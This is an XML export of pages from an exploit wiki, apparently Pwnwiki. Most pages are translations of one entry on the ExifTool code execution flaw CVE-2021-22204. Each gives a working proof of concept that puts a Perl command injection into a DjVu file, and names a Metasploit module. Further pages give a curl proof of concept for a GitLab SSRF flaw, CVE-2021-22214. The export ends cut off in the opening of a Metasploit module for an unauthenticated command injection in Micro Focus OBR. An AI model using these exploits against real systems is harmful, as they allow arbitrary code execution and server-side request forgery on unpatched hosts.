exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>kprtc4vic8zx7zj56pxg8l15qyk5jij</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/or</title>
    <ns>0</ns>
    <id>2601</id>
    <revision>
      <id>3100</id>
      <timestamp>2021-05-23T02:17:34Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== ପ୍ରଭାବିତ ସଂସ୍କରଣ =="</comment>
      <origin>3100</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="616" sha1="784rxn8nzxa0gwmbpoilbntwkqiad28" xml:space="preserve">&lt;languages /&gt;

== ପ୍ରଭାବିତ ସଂସ୍କରଣ ==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>784rxn8nzxa0gwmbpoilbntwkqiad28</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/pa</title>
    <ns>0</ns>
    <id>2712</id>
    <revision>
      <id>3211</id>
      <timestamp>2021-05-23T02:58:44Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2021-22204 ExifTool ਆਪਹੁਦਾਰੀ ਕੋਡ ਨੂੰ ਚਲਾਉਣ ਦੀ ਕਮਜ਼ੋਰੀ"</comment>
      <origin>3211</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="613" sha1="aipnjamtfcyniqqgn1l9m18kqk9ab4t" xml:space="preserve">&lt;languages /&gt;

== ਪ੍ਰਭਾਵਿਤ ਸੰਸਕਰਣ ==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>aipnjamtfcyniqqgn1l9m18kqk9ab4t</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/pl</title>
    <ns>0</ns>
    <id>2729</id>
    <revision>
      <id>3228</id>
      <timestamp>2021-05-23T04:23:03Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2021-22204 ExifTool luka umożliwiająca wykonanie dowolnego kodu"</comment>
      <origin>3228</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="601" sha1="l83emltoiz3m0q4l1pkhz27lod5vxuj" xml:space="preserve">&lt;languages /&gt;

== Wersja, której dotyczy problem ==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>l83emltoiz3m0q4l1pkhz27lod5vxuj</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/ps</title>
    <ns>0</ns>
    <id>2714</id>
    <revision>
      <id>3213</id>
      <timestamp>2021-05-23T02:59:48Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== اغیزه شوې نسخه =="</comment>
      <origin>3213</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="596" sha1="oty34g6uixs507dyl9pl32iogkgtb3y" xml:space="preserve">&lt;languages /&gt;

== اغیزه شوې نسخه ==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>oty34g6uixs507dyl9pl32iogkgtb3y</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/pt</title>
    <ns>0</ns>
    <id>2735</id>
    <revision>
      <id>3234</id>
      <timestamp>2021-05-23T05:10:35Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "Vulnerabilidade de execução arbitrária de código CVE-2021-22204 ExifTool"</comment>
      <origin>3234</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="585" sha1="r0ayelnvfc989kr4qycdne5yc15pk9q" xml:space="preserve">&lt;languages /&gt;

== Versão afetada ==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>r0ayelnvfc989kr4qycdne5yc15pk9q</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/ro</title>
    <ns>0</ns>
    <id>2736</id>
    <revision>
      <id>3235</id>
      <timestamp>2021-05-23T05:23:30Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== Versiune afectată =="</comment>
      <origin>3235</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="588" sha1="b6ail5ly2nauhhzusmtovin0cvni59f" xml:space="preserve">&lt;languages /&gt;

== Versiune afectată ==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>b6ail5ly2nauhhzusmtovin0cvni59f</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/ru</title>
    <ns>0</ns>
    <id>2334</id>
    <revision>
      <id>2775</id>
      <timestamp>2021-05-11T12:15:38Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2021-22204 Уязвимость выполнения произвольного кода ExifTool"</comment>
      <origin>2775</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="597" sha1="a39qjol1lfr5yld1378zqoyczdtegtx" xml:space="preserve">&lt;languages /&gt;

Затронутая версия
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>a39qjol1lfr5yld1378zqoyczdtegtx</sha1>
    </revision>
    <revision>
      <id>2777</id>
      <parentid>2775</parentid>
      <timestamp>2021-05-11T12:19:40Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <origin>2777</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="601" sha1="tti6plo4kd93z22xnttca7ydz9yrtwf" xml:space="preserve">&lt;languages /&gt;

==Затронутая версия==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>tti6plo4kd93z22xnttca7ydz9yrtwf</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/rw</title>
    <ns>0</ns>
    <id>2693</id>
    <revision>
      <id>3192</id>
      <timestamp>2021-05-23T02:45:56Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== Impinduka zagize ingaruka =="</comment>
      <origin>3192</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="595" sha1="pwcp0h0jvqana8qinq1411u34agn4u6" xml:space="preserve">&lt;languages /&gt;

== Impinduka zagize ingaruka ==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>pwcp0h0jvqana8qinq1411u34agn4u6</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/sq</title>
    <ns>0</ns>
    <id>2727</id>
    <revision>
      <id>3226</id>
      <timestamp>2021-05-23T04:10:43Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== Versioni i prekur =="</comment>
      <origin>3226</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="587" sha1="tml2u33kgdxkccsa85yup0ry70prtek" xml:space="preserve">&lt;languages /&gt;

== Versioni i prekur ==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>tml2u33kgdxkccsa85yup0ry70prtek</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/sv</title>
    <ns>0</ns>
    <id>2721</id>
    <revision>
      <id>3220</id>
      <timestamp>2021-05-23T03:15:39Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== Berörd version =="</comment>
      <origin>3220</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="585" sha1="5z0h0me17idqbqnhq2mik8mrdntz5p0" xml:space="preserve">&lt;languages /&gt;

== Berörd version ==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>5z0h0me17idqbqnhq2mik8mrdntz5p0</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/tg-cyrl</title>
    <ns>0</ns>
    <id>2718</id>
    <revision>
      <id>3217</id>
      <timestamp>2021-05-23T03:04:35Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== Версияи зарардида =="</comment>
      <origin>3217</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="603" sha1="pztdj6fxxihkbbd47pptckr6bvf92re" xml:space="preserve">&lt;languages /&gt;

== Версияи зарардида ==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>pztdj6fxxihkbbd47pptckr6bvf92re</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/tr</title>
    <ns>0</ns>
    <id>2600</id>
    <revision>
      <id>3099</id>
      <timestamp>2021-05-23T02:16:25Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2021-22204 ExifTool keyfi kod yürütme güvenlik açığı"</comment>
      <origin>3099</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="587" sha1="s1rqgzzbteopw90dd45kbgmq3eowp98" xml:space="preserve">&lt;languages /&gt;

== Etkilenen sürüm ==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>s1rqgzzbteopw90dd45kbgmq3eowp98</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/tt-cyrl</title>
    <ns>0</ns>
    <id>2624</id>
    <revision>
      <id>3123</id>
      <timestamp>2021-05-23T02:26:12Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2021-22204 ExifTool үзенчәлекле код башкару зәгыйфьлеге"</comment>
      <origin>3123</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="605" sha1="kw6fh66gtxh055j3ofbjicvwaf01syw" xml:space="preserve">&lt;languages /&gt;

== Күрсәтелгән версия ==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>kw6fh66gtxh055j3ofbjicvwaf01syw</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/uk</title>
    <ns>0</ns>
    <id>2724</id>
    <revision>
      <id>3223</id>
      <timestamp>2021-05-23T03:53:26Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== Постраждала версія =="</comment>
      <origin>3223</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="605" sha1="j6k89ei8qgshv88xecqwvhqzfse7lsh" xml:space="preserve">&lt;languages /&gt;

== Постраждала версія ==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>j6k89ei8qgshv88xecqwvhqzfse7lsh</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/vi</title>
    <ns>0</ns>
    <id>2739</id>
    <revision>
      <id>3238</id>
      <timestamp>2021-05-23T05:43:40Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== Phiên bản bị ảnh hưởng =="</comment>
      <origin>3238</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="602" sha1="ehxvxi96ih17yc4fyt6frrsfzbexkmn" xml:space="preserve">&lt;languages /&gt;

== Phiên bản bị ảnh hưởng ==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>ehxvxi96ih17yc4fyt6frrsfzbexkmn</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/zh-hant</title>
    <ns>0</ns>
    <id>2331</id>
    <revision>
      <id>2770</id>
      <timestamp>2021-05-11T12:12:24Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==Затронутая версия=="</comment>
      <origin>2770</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="601" sha1="tti6plo4kd93z22xnttca7ydz9yrtwf" xml:space="preserve">&lt;languages /&gt;

==Затронутая версия==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>tti6plo4kd93z22xnttca7ydz9yrtwf</sha1>
    </revision>
    <revision>
      <id>2778</id>
      <parentid>2770</parentid>
      <timestamp>2021-05-11T12:21:04Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <origin>2778</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="580" sha1="4gonqmsptikep7xbs3enkl1s19nnec8" xml:space="preserve">&lt;languages /&gt;

==影響版本==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>4gonqmsptikep7xbs3enkl1s19nnec8</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22214 GitLab前台SSRF漏洞</title>
    <ns>0</ns>
    <id>4701</id>
    <revision>
      <id>5405</id>
      <timestamp>2021-06-20T07:40:55Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==漏洞影響== &lt;/translate&gt; &lt;pre&gt; GitLab CE/EE &gt;=10.5 &lt;/pre&gt;  ==POC== &lt;pre&gt; curl -s --show-error -H 'Content-Type: application/json' https://exampl..."</comment>
      <origin>5405</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="326" sha1="csext3kckm5hdvm7qczxv0kiqzpws88" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞影響==
&lt;/translate&gt;
&lt;pre&gt;
GitLab CE/EE &gt;=10.5
&lt;/pre&gt;

==POC==
&lt;pre&gt;
curl -s --show-error -H 'Content-Type: application/json' https://example.gitlab.com/api/v4/ci/lint --data '{ "include_merged_yaml": true, "content": "include:\n  remote: http://&lt;ip&gt;:&lt;port&gt;/api/v1/targets?test.yml"}'
&lt;/pre&gt;</text>
      <sha1>csext3kckm5hdvm7qczxv0kiqzpws88</sha1>
    </revision>
    <revision>
      <id>5406</id>
      <parentid>5405</parentid>
      <timestamp>2021-06-20T07:42:53Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>5406</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="337" sha1="rpbrthctgzy9er8mzhrvjeoobyagcvg" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞影響== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;pre&gt;
GitLab CE/EE &gt;=10.5
&lt;/pre&gt;

==POC==
&lt;pre&gt;
curl -s --show-error -H 'Content-Type: application/json' https://example.gitlab.com/api/v4/ci/lint --data '{ "include_merged_yaml": true, "content": "include:\n  remote: http://&lt;ip&gt;:&lt;port&gt;/api/v1/targets?test.yml"}'
&lt;/pre&gt;</text>
      <sha1>rpbrthctgzy9er8mzhrvjeoobyagcvg</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22214 GitLab前台SSRF漏洞/zh-tw</title>
    <ns>0</ns>
    <id>5104</id>
    <revision>
      <id>5844</id>
      <timestamp>2021-06-24T02:49:41Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==漏洞影響=="</comment>
      <origin>5844</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="301" sha1="489irvas2z1v05qzph7xzm42g6zy02i" xml:space="preserve">&lt;languages /&gt;
==漏洞影響==
&lt;pre&gt;
GitLab CE/EE &gt;=10.5
&lt;/pre&gt;

==POC==
&lt;pre&gt;
curl -s --show-error -H 'Content-Type: application/json' https://example.gitlab.com/api/v4/ci/lint --data '{ "include_merged_yaml": true, "content": "include:\n  remote: http://&lt;ip&gt;:&lt;port&gt;/api/v1/targets?test.yml"}'
&lt;/pre&gt;</text>
      <sha1>489irvas2z1v05qzph7xzm42g6zy02i</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22502 Micro Focus Operations Bridge Reporter 未經驗證命令注入漏洞</title>
    <ns>0</ns>
    <id>1812</id>
    <revision>
      <id>2229</id>
      <timestamp>2021-05-05T05:16:03Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  class MetasploitModule..."</comment>
      <origin>2229</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="4478" sha1="5le0wwx29wj0ykzgz2alzu7z30va7uz" xml:space="preserve">==EXP==
&lt;pre&gt;
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule &lt; Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' =&gt; 'Micro Focus Operations Bridge Reporter Unauthenticated Command Injection',
        'Description' =&gt; %q{
          This module exploits a command injection vulnerability on *login* (yes, you read that right)
          that affects Micro Focus Operations Bridge Reporter on Linux, versions 10.40 and below.
          It's a straight up command injection, with little escaping required and it works before
          authentication.
          This module has been tested on the Linux 10.40 version. Older versions might be affected,
          check the advisory for details.
        },
        'Author' =&gt;
          [
            'Pedro Ribeiro &lt;pedrib[at]gmail.com&gt;' # Vulnerability discovery and MSF module
          ],
        'License' =&gt; MSF_LICENSE,
        'References' =&gt;
          [
            ['CVE', '2021-22502'],
            ['ZDI', '21-153'],
            ['URL', 'https://github.com/pedrib/PoC/blob/master/advisories/Micro_Focus/Micro_Focus_OBR.md'],
